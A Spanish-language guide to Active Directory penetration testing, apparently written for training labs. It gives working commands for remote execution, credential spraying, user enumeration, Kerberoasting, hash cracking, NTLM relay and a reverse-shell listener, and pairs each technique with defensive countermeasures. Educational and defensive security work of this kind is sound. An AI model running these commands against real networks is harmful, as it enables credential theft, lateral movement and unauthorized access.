# 🔐 Guía Completa de Herramientas de Penetración en Active Directory

## 📋 Tabla de Contenidos
- [Introducción](#introducción)
- [Herramientas Principales](#herramientas-principales)
- [Flujo de Ataque Típico](#flujo-de-ataque-típico)
- [Comandos Esenciales](#comandos-esenciales)
- [Medidas de Defensa](#medidas-de-defensa)
- [Referencias](#referencias)

---

## 🎯 Introducción

Este repositorio documenta las herramientas y técnicas más utilizadas en auditorías de seguridad y pruebas de penetración en entornos **Active Directory**. Desde el reconocimiento inicial hasta la ejecución remota de comandos, aquí encontrarás un análisis detallado de cada paso.

> ⚠️ **Nota Legal**: Estas herramientas deben utilizarse **únicamente** con autorización explícita en entornos controlados. Su uso no autorizado es ilegal.

---

## 🛠️ Herramientas Principales

### 1. **psexec.py** - Ejecución Remota
```bash
psexec.py s4vicorp.local/Administrador:P@\$w0rd\!@192.168.94.138 cmd.exe
```
**Función**: Obtiene una consola interactiva en máquinas remotas usando credenciales de administrador.

**Casos de uso**:
- ✅ Administración remota legítima
- ✅ Movimiento lateral en redes corporativas
- ✅ Auditorías de seguridad autorizadas

**Requisitos**: Privilegios de administrador en el equipo destino

---

### 2. **CrackMapExec (CME)** - Validación Masiva de Credenciales
```bash
cme smb 192.168.94.0/24 -u 'SVC_SQLservice' -p 'MYpassword123#'
```
**Función**: Escanea redes completas buscando máquinas donde las credenciales sean válidas.

**Información que proporciona**:
- 🔍 Máquinas donde el usuario tiene acceso
- 🔍 Privilegios de administrador local (`Pwn3d!`)
- 🔍 Sistema operativo y nombre del equipo

---

### 3. **rpcclient** - Enumeración de Usuarios
```bash
rpcclient -U "s4vicorp.local\mvazquez%Password1" 192.168.94.136 -c 'enumdomusers'
```
**Función**: Extrae la lista completa de usuarios del dominio a través del protocolo RPC.

**Información extraída**:
- 📝 Nombres de cuentas
- 📝 RID (Relative Identifiers)
- 📝 Descripciones y comentarios

---

### 4. **GetUserSPNs.py** - Kerberoasting
```bash
GetUserSPNs.py s4vicorp.local/ramlux:password -request
```
**Función**: Solicita tickets de Kerberos (TGS) para cuentas de servicio y obtiene sus hashes.

**Ventajas del ataque**:
- 🎭 No requiere inicios de sesión fallidos
- 🎭 Muy "silencioso" (difícil de detectar)
- 🎭 Las cuentas de servicio suelen tener contraseñas débiles

---

### 5. **John the Ripper** - Craqueo de Hashes
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
**Función**: Descifra hashes de Kerberos usando diccionarios de contraseñas.

**Resultado típico**:
```
MYpassword123#     (svc_sqlservice)
```

---

### 6. **Responder + ntlmrelayx.py** - NTLM Relay
```bash
# Terminal 1: Capturar hashes
python3 Responder.py -I eth0 -rdw

# Terminal 2: Retransmitir credenciales
ntlmrelayx.py -tf targets.txt -smb2support
```
**Función**: Captura autenticaciones de red y las retransmite en tiempo real para ganar acceso.

---

### 7. **Nishang + Netcat** - Reverse Shell
```bash
# Servidor de descarga
python -m SimpleHTTPServer

# Escucha de conexión
nc -nlvp 4646
```
**Función**: Prepara la infraestructura para obtener control remoto de máquinas comprometidas.

---

## 🔄 Flujo de Ataque Típico

```
┌─────────────────────────────────────────────────────────┐
│ 1. RECONOCIMIENTO                                       │
│    └─ rpcclient → Enumerar usuarios del dominio        │
└──────────────────┬──────────────────────────────────────┘
                   │
┌──────────────────▼──────────────────────────────────────┐
│ 2. OBTENCIÓN DE CREDENCIALES                            │
│    ├─ GetUserSPNs.py → Kerberoasting                   │
│    └─ John the Ripper → Craqueo de hashes              │
└──────────────────┬──────────────────────────────────────┘
                   │
┌──────────────────▼──────────────────────────────────────┐
│ 3. VALIDACIÓN DE ACCESO                                 │
│    └─ CrackMapExec → Probar credenciales en la red     │
└──────────────────┬──────────────────────────────────────┘
                   │
┌──────────────────▼──────────────────────────────────────┐
│ 4. MOVIMIENTO LATERAL                                   │
│    └─ psexec.py → Ejecutar comandos remotamente        │
└──────────────────┬──────────────────────────────────────┘
                   │
┌──────────────────▼──────────────────────────────────────┐
│ 5. OBTENCIÓN DE SHELL                                   │
│    └─ Reverse Shell → Control total del sistema        │
└─────────────────────────────────────────────────────────┘
```

---

## 📚 Comandos Esenciales

| Categoría | Comando | Función |
|-----------|---------|---------|
| **Ejecución Remota** | `psexec.py [dominio]/[usuario]:[pass]@[IP] cmd.exe` | Consola interactiva remota |
| **Enumeración** | `cme smb [rango] -u [usuario] -p [pass]` | Validación masiva de credenciales |
| **Enumeración RPC** | `rpcclient -U "[dominio]\[usuario]%[pass]" [IP] -c 'enumdomusers'` | Lista de usuarios del dominio |
| **Kerberoasting** | `GetUserSPNs.py [dominio]/[usuario]:[pass] -request` | Obtener hashes de servicios |
| **Craqueo** | `john --wordlist=[diccionario] [hash]` | Descifrar hashes |
| **NTLM Relay** | `Responder.py -I [interfaz] -rdw` | Capturar autenticaciones |
| **Retransmisión** | `ntlmrelayx.py -tf [targets.txt] -smb2support` | Usar hashes capturados |
| **Servidor Web** | `python -m SimpleHTTPServer` | Servir archivos de ataque |
| **Listener** | `nc -nlvp [puerto]` | Recibir reverse shell |

---

## 🛡️ Medidas de Defensa

### ✅ Contra psexec.py
- Restringir acceso a recursos administrativos (`ADMIN$`)
- Implementar **MFA** en cuentas de administrador
- Monitorear intentos de conexión remota

### ✅ Contra CrackMapExec
- Implementar **políticas de contraseña fuerte**
- Usar **bloqueo de cuenta** tras intentos fallidos
- Monitorear intentos de autenticación masivos

### ✅ Contra Enumeración RPC
- Deshabilitar **null sessions** (por defecto en Windows moderno)
- Restringir permisos de lectura en el directorio activo
- Auditar acceso a servicios RPC

### ✅ Contra Kerberoasting
- Usar **contraseñas complejas** en cuentas de servicio
- Implementar **Managed Service Accounts (MSA)**
- Monitorear solicitudes de tickets TGS sospechosas

### ✅ Contra NTLM Relay
- Habilitar **SMB Signing** en todos los servidores
- Usar **Kerberos** en lugar de NTLM cuando sea posible
- Implementar **LDAP Signing**

### ✅ Contra Reverse Shells
- Implementar **EDR** (Endpoint Detection and Response)
- Monitorear conexiones de red salientes
- Bloquear PowerShell sin restricciones

---

## 📖 Referencias

- [Impacket GitHub](https://github.com/fortra/impacket)
- [CrackMapExec Documentation](https://github.com/byt3bl33d3r/CrackMapExec)
- [Nishang PowerShell Suite](https://github.com/samratashok/nishang)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## 🤝 Contribuciones

Este documento es educativo. Las contribuciones para mejorar las medidas de defensa son bienvenidas.

---

## ⚖️ Disclaimer

**Este contenido es únicamente para fines educativos y de investigación en ciberseguridad.** El uso no autorizado de estas herramientas contra sistemas que no te pertenecen es **ilegal** y puede resultar en consecuencias legales graves.

---

**Última actualización**: 2024 | **Nivel**: Intermedio-Avanzado 🔴
